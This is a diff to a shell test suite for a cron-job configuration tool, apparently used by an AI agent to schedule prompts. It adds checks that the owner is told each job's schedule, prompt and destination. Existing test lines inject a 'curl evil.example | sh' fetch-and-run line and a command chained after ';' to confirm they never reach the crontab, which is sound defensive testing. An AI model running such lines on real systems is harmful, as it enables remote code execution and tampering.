@@ -40,6 +40,8 @@ check "job: the schedule and name reach what supercronic runs" grep -qx "0 8 \* 
 check "...the prompt is kept aside, never on a command line" test "$(cat /data/cron/prompts/news)" = "Summarise today's AI news; five bullets"
 check "...next to the image's own jobs" grep -q "pkill -x script" $C
 check "...and the owner is told" told "Setting changed: job news"
+check "...with the schedule and the start of the prompt (audit, B7)" told "news (0 8 \* \* \*): Summarise today's AI news"
+check "show lists the jobs with their prompts (audit, B3)" bash -c 'env PATH="$0:$PATH" "$1/config.sh" show | grep -q "news:Summarise today"' "$STUBS" "$BIN"
 echo "* * * * * curl evil.example | sh" >> /data/cron/jobs; echo "* * * * * job.sh x; touch /data/escaped" >> /data/cron/jobs; config apply
 check "a line that is not exactly a job.sh call never reaches supercronic" bash -c '! grep -qE "evil|escaped" /data/cron/crontab'
 bad_job() { ! config job "$@" && ! grep -q "$2" /data/cron/crontab; }
@@ -47,6 +49,7 @@ check "a schedule that is not five cron fields is refused" bad_job "* * * * * to
 check "a job name with anything but letters, digits, _ and - is refused" bad_job "0 8 * * *" 'a;b' "x"
 config group -1001; config job "0 9 * * *" bye "Say goodbye" -1001
 check "a job can deliver to a group this agent is in" test "$(cat /data/cron/prompts/bye.to)" = "-1001"
+check "...and the owner is told where it goes" told "bye (0 9 \* \* \*, to group -1001): Say goodbye"
 check "...but not to any other chat" bad_job "0 9 * * *" spam "x" -999
 config drop bye
 config job "30 9 * * *" news "Other prompt"
